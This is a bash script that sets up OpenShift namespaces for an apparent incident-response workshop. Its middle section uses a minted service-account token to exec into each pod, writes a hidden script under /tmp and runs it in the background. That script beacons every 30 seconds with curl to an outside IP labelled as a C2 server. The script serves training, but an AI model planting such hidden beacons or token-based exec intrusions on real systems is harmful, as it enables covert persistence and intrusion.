#!/usr/bin/env bash
# Deploy ACME incident workshop environments (payment-gateway + vulnerable-workload).
# Run as cluster-admin from the repository root: ./setup/deploy-incident-env.sh
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ATTENDEE_COUNT="${ATTENDEE_COUNT:-30}"

echo "==> Deploying payment-gateway environments for attendees 1..${ATTENDEE_COUNT}"
for i in $(seq 1 "${ATTENDEE_COUNT}"); do
  oc delete pod -l app=payment-gateway --namespace="payment-gateway-${i}" --grace-period=0 --force 2>/dev/null || true
  oc wait --for=delete pod -l app=payment-gateway --namespace="payment-gateway-${i}" --timeout=30s 2>/dev/null || true
  oc process --filename "${SCRIPT_DIR}/app-template.yaml" --param "SUFFIX=${i}" | oc apply --filename -
done

echo "==> Waiting for payment-gateway pods..."
oc wait --for=condition=Ready pods --selector app=payment-gateway --all-namespaces --timeout=120s

echo "==> Simulating compromised exec intrusion..."
for i in $(seq 1 "${ATTENDEE_COUNT}"); do
  namespace="payment-gateway-${i}"
  token=$(oc create token cicd-pipeline-runner-sa --namespace "${namespace}")
  oc exec pod/payment-gateway \
    --namespace "${namespace}" \
    --token "${token}" \
    --container httpd \
    -- sh -c '
      export C2_SERVER="185.199.108.153"
      export CODENAME="SHADOW_PIVOT"
      export ENV_MARKER="ACME_SECRET_KEY_EXFIL_TEST_9921"
      mkdir -p /tmp/.hidden_toolkit
      cat << "EOF" > /tmp/.hidden_toolkit/exfil.sh
#!/bin/sh
while true; do
  curl --silent --max-time 2 --output /dev/null \
    --header "X-Agent-ID: SHADOW_PIVOT" \
    --header "X-Target-Namespace: payment-gateway" \
    "http://185.199.108.153/api/v1/beacon"
  sleep 30
done
EOF
      chmod +x /tmp/.hidden_toolkit/exfil.sh
      /tmp/.hidden_toolkit/exfil.sh > /dev/null 2>&1 &
    '
  echo "[+] Namespace ${namespace} weaponized."
done

echo "==> Deploying vulnerable-workload environments..."
for i in $(seq 1 "${ATTENDEE_COUNT}"); do
  export NAMESPACE="vulnerable-workload-${i}"
  envsubst < "${SCRIPT_DIR}/exercise4/k8s/namespace.yaml" | oc apply --filename -
  envsubst < "${SCRIPT_DIR}/exercise4/k8s/redis.yaml" | oc apply --filename -
  envsubst < "${SCRIPT_DIR}/exercise4/k8s/edge-server.yaml" | oc apply --filename -
  envsubst < "${SCRIPT_DIR}/exercise4/k8s/socketio-server.yaml" | oc apply --filename -
  envsubst < "${SCRIPT_DIR}/exercise4/k8s/edge-server-route.yaml" | oc apply --filename -
  envsubst < "${SCRIPT_DIR}/exercise4/k8s/socketio-server-route.yaml" | oc apply --filename -
done

echo "==> Done. Verify with: oc get pods -n payment-gateway-1 && oc get pods -n vulnerable-workload-1"
